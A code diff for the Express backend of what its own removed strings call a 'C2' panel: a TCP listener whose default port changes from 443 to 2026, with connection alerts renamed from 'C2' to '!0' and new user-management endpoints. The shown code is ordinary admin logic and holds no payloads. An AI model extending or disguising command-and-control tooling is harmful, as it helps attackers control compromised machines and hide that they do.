     }
@@ -1824,7 +2078,7 @@ app.put('/api/settings', async (req, res) => {
   // Hot-restart TCP server if host/port changed
   const s = getAllSettings();
   try {
-    await restartTcpServerIfNeeded(s.serverHost || '0.0.0.0', s.serverPort || 443);
+    await restartTcpServerIfNeeded(s.serverHost || '0.0.0.0', s.serverPort || 2026);
     res.json({ ok: true });
   } catch (e) {
     console.error('Failed to restart TCP server:', e.message);
@@ -2021,7 +2275,7 @@ app.post('/api/email/settings', async (req, res) => {
       emailPass: body.emailPass || '',
       emailFrom: body.emailFrom || body.emailUser || '',
       emailTo: Array.isArray(body.emailTo) ? body.emailTo : [],
-      emailSubject: body.emailSubject || 'C2 Client Connection Alert'
+      emailSubject: body.emailSubject || '!0 Connection Alert'
     };
 
     // Validate required fields if email is enabled
@@ -2056,6 +2310,141 @@ app.post('/api/email/settings', async (req, res) => {
   }
 });
 
+// User Management API
+app.get('/api/users', requireAuth, async (req, res) => {
+  try {
+    await loadDb();
+    const stmt = db.prepare('SELECT username, role, email FROM users');
+    const users = [];
+    while (stmt.step()) {
+      users.push(stmt.getAsObject());
+    }
+    stmt.free();
+    res.json({ users });
+  } catch (error) {
+    console.error('[API] Failed to get users:', error);
+    res.status(500).json({ error: 'Failed to load users' });
+  }
+});
+
+app.post('/api/users', requireAuth, async (req, res) => {
+  try {
+    await loadDb();
+    const { username, password, role = 'user', email = '' } = req.body;
+    const emailNorm = String(email || '').trim().toLowerCase();
+    
+    if (!username || !password) {
+      return res.status(400).json({ error: 'Username and password are required' });
+    }
+    if (!emailNorm || !isValidEmail(emailNorm)) {
+      return res.status(400).json({ error: 'A valid Gmail/email is required for OTP delivery' });
+    }
+
+    if (role !== 'user' && role !== 'admin') {
+      return res.status(400).json({ error: 'Role must be user or admin' });
+    }
+
+    // Check if user already exists
+    const existing = getUser(username);
+    if (existing) {
+      return res.status(400).json({ error: 'User already exists' });
+    }
+
+    // Create user
+    const passwordHash = bcrypt.hashSync(password, 10);
+    const stmt = db.prepare('INSERT INTO users (username, passwordHash, role, email) VALUES (?, ?, ?, ?)');
+    stmt.run([username, passwordHash, role, emailNorm]);
+    stmt.free();
+    persistDb();
+
+    res.json({ message: 'User created successfully' });
+  } catch (error) {
+    console.error('[API] Failed to create user:', error);
+    res.status(500).json({ error: 'Failed to create user' });
+  }
+});
+
+app.put('/api/users/:username', requireAuth, async (req, res) => {
+  try {
+    await loadDb();
+    const { username } = req.params;
+    const { password, role, email } = req.body;
+    const hasEmail = email !== undefined && email !== null;
+
+    if (!password && !role && !hasEmail) {
+      return res.status(400).json({ error: 'Password, role, or email is required' });
+    }
+
+    const user = getUser(username);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    if (role && role !== 'user' && role !== 'admin') {
+      return res.status(400).json({ error: 'Role must be user or admin' });
+    }
+
+    let emailNorm = hasEmail ? String(email || '').trim().toLowerCase() : null;
+    if (hasEmail && (!emailNorm || !isValidEmail(emailNorm))) {
+      return res.status(400).json({ error: 'A valid Gmail/email is required for OTP delivery' });
+    }
+
+    const nextRole = role || user.role;
+    const nextEmail = hasEmail ? emailNorm : (user.email || '');
+
+    if (password) {
+      const passwordHash = bcrypt.hashSync(password, 10);
+      const stmt = db.prepare('UPDATE users SET passwordHash = ?, role = ?, email = ? WHERE username = ?');
+      stmt.run([passwordHash, nextRole, nextEmail, username]);
+      stmt.free();
+    } else {
+      const stmt = db.prepare('UPDATE users SET role = ?, email = ? WHERE username = ?');
+      stmt.run([nextRole, nextEmail, username]);
+      stmt.free();
+    }
+    
+    persistDb();
+    res.json({ message: 'User updated successfully' });
+  } catch (error) {
+    console.error('[API] Failed to update user:', error);
+    res.status(500).json({ error: 'Failed to update user' });
+  }
+});
+
+app.delete('/api/users/:username', requireAuth, async (req, res) => {
+  try {
+    await loadDb();
+    const { username } = req.params;
+
+    const user = getUser(username);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    // Don't allow deleting the last admin
+    const stmt = db.prepare('SELECT COUNT(*) as count FROM users WHERE role = ?');
+    stmt.bind(['admin']);
+    stmt.step();
+    const adminCount = stmt.getAsObject().count;
+    stmt.free();
+
+    if (user.role === 'admin' && adminCount <= 1) {
+      return res.status(400).json({ error: 'Cannot delete the last admin user' });
+    }
+
+    // Delete user
+    const deleteStmt = db.prepare('DELETE FROM users WHERE username = ?');
+    deleteStmt.run([username]);
+    deleteStmt.free();
+    persistDb();
+
+    res.json({ message: 'User deleted successfully' });
+  } catch (error) {
+    console.error('[API] Failed to delete user:', error);
+    res.status(500).json({ error: 'Failed to delete user' });
+  }
+});
+
 // Serve React app
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'client/build', 'index.html'));
@@ -2065,5 +2454,5 @@ const HOST = process.env.HOST || '0.0.0.0';
 const PORT = Number(process.env.PORT || 5000);
 server.listen(PORT, HOST, () => {
   console.log(`[HTTP] Server running on ${HOST}:${PORT}`);
-  console.log(`[GUI] Access the C2 interface at: http://${HOST === '0.0.0.0' ? 'localhost' : HOST}:${PORT}`);
+  console.log(`[GUI] Access !0 at: http://${HOST === '0.0.0.0' ? 'localhost' : HOST}:${PORT}`);
 });
